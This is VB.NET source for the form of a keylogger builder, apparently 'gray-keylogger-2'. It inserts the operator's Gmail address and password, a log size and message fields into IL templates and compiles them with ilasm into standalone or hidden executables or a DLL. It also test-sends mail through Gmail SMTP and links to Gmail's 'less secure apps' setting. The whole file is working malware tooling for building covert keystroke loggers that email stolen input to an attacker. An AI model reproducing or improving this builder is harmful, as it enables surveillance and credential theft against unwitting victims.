Imports System.Net.Mail
Public Class Form1
    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        Select Case CheckBox1.Checked
            Case True
                CheckBox2.Checked = False
            Case Else
                CheckBox2.Checked = True
        End Select
    End Sub
    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        Select Case CheckBox2.Checked
            Case True
                CheckBox1.Checked = False
            Case Else
                CheckBox1.Checked = True
        End Select
    End Sub
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        If TextBox4.UseSystemPasswordChar = False Then
            Button4.Text = "hide"
            TextBox4.UseSystemPasswordChar = True
        Else
            Button4.Text = "show"
            TextBox4.UseSystemPasswordChar = False
        End If
    End Sub
    Private Sub TextBox4_TextChanged(sender As Object, e As EventArgs) Handles TextBox4.TextChanged
        TextBox4.PasswordChar = "*"
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If My.Computer.Network.IsAvailable Then
            Using Mail As New MailMessage With {.Subject = TextBox5.Text}
                Mail.To.Add(TextBox2.Text & "@gmail.com")
                Mail.From = New MailAddress(TextBox2.Text & "@gmail.com")
                Mail.Body = TextBox6.Text
                Try
                    Using SMTP As New SmtpClient("smtp.gmail.com") With {
                    .EnableSsl = True,
                    .Credentials = New Net.NetworkCredential(TextBox2.Text & "@gmail.com", TextBox4.Text),
                    .Port = "587"
                }
                        SMTP.Send(Mail)
                    End Using
                    MsgBox("Message sent successfully, Please check your inbox.")
                Catch ex As Exception
                    MessageBox.Show(ex.Message, "Failure", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    MsgBox("Please check whether lesssecureapps are allowed in your gmail and" & vbNewLine & "also Email and Password.")
                End Try
            End Using
        Else
            MessageBox.Show("Please check your internet connection.", "Connection Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub
    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("https://myaccount.google.com/lesssecureapps")
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Dim a = Nothing
            If CheckBox1.Checked Then
                a += 1000
            ElseIf CheckBox2.Checked Then
                a += 1000000
            End If
            Dim Logsize = TextBox1.Text * a
            If Not Logsize >= 50000000 Then
                Dim gs
                If RadioButton4.Checked Then
                    gs = Replace(My.Computer.FileSystem.ReadAllText("Library.il"), "[logsize]", Logsize)
                ElseIf RadioButton3.Checked Then
                    If CheckBox3.Checked Then
                        gs = Replace(My.Computer.FileSystem.ReadAllText("Executable_hidden.il"), "[logsize]", Logsize)
                    Else
                        gs = Replace(My.Computer.FileSystem.ReadAllText("Executable.il"), "[logsize]", Logsize)
                    End If
                End If
                Dim hs = Replace(gs, "[email]", TextBox2.Text & "@gmail.com")
                Dim js = Replace(hs, "[password]", TextBox4.Text)
                Dim ks = Replace(js, "[body]", TextBox6.Text)
                Dim ss = Replace(ks, "[subject]", TextBox5.Text)
                If My.Computer.FileSystem.FileExists("temp.il") Then
                    My.Computer.FileSystem.DeleteFile("temp.il")
                End If
                If My.Computer.FileSystem.FileExists("temp.bat") Then
                    My.Computer.FileSystem.DeleteFile("temp.bat")
                End If
                My.Computer.FileSystem.WriteAllText("temp.il", ss, False)
                If RadioButton4.Checked Then
                    If FolderBrowserDialog1.ShowDialog = DialogResult.OK Then
                        If CheckBox3.Checked Then
                            My.Computer.FileSystem.CopyFile("Executer_hidden.exe", FolderBrowserDialog1.SelectedPath & "\Executer_hidden.exe", Microsoft.VisualBasic.FileIO.UIOption.AllDialogs, Microsoft.VisualBasic.FileIO.UICancelOption.DoNothing)
                            My.Computer.FileSystem.WriteAllText("temp.bat", "@echo off" & vbNewLine & "ilasm.exe" & " temp.il /DLL /NOLOGO /FOLD /OPTIMIZE /OUTPUT=""" & FolderBrowserDialog1.SelectedPath & "\Library.dll" & """" & vbNewLine & "pause", False)
                            Process.Start("temp.bat").WaitForExit()
                        Else
                            My.Computer.FileSystem.CopyFile("Executer.exe", FolderBrowserDialog1.SelectedPath & "\Executer.exe", Microsoft.VisualBasic.FileIO.UIOption.AllDialogs, Microsoft.VisualBasic.FileIO.UICancelOption.DoNothing)
                            My.Computer.FileSystem.WriteAllText("temp.bat", "@echo off" & vbNewLine & "ilasm.exe" & " temp.il /DLL /NOLOGO /FOLD /OPTIMIZE /OUTPUT=""" & FolderBrowserDialog1.SelectedPath & "\Library.dll" & """" & vbNewLine & "pause", False)
                            Process.Start("temp.bat").WaitForExit()
                        End If
                    End If
                ElseIf RadioButton3.Checked Then
                    SaveFileDialog1.InitialDirectory = "Desktop"
                    SaveFileDialog1.Filter = "Executable Files|*.exe"
                    If SaveFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
                        My.Computer.FileSystem.WriteAllText("temp.bat", "@echo off" & vbNewLine & "ilasm.exe" & " temp.il /NOLOGO /FOLD /OPTIMIZE /OUTPUT=""" & SaveFileDialog1.FileName & """" & vbNewLine & "pause", False)
                        Process.Start("temp.bat").WaitForExit()
                    End If
                End If
                If My.Computer.FileSystem.FileExists("temp.bat") Then
                    My.Computer.FileSystem.DeleteFile("temp.bat")
                End If
                If My.Computer.FileSystem.FileExists("temp.il") Then
                    My.Computer.FileSystem.DeleteFile("temp.il")
                End If
            Else
                MsgBox("Gmail doesn't allow you post file greater than 50MB. Please decrease the value of Logsize.")
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Process.Start("https://github.com/graysuit/gray-keylogger-2")
    End Sub
End Class
